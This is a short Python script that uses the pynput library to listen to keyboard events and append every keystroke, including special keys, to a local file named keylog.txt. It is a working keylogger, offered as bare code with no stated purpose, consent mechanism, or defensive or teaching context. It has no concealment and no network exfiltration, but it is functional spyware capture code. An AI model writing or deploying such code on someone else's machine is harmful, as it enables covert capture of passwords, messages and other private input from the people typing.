from pynput import keyboard

# File to log the keystrokes
log_file = "keylog.txt"

# Function to log the key
def on_press(key):
    try:
        # Try to get the character of the key
        key_log = key.char
    except AttributeError:
        # Special keys (e.g., arrow keys, space, etc.)
        key_log = str(key)

    # Write the key to the log file
    with open(log_file, "a") as f:
        f.write(key_log)

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
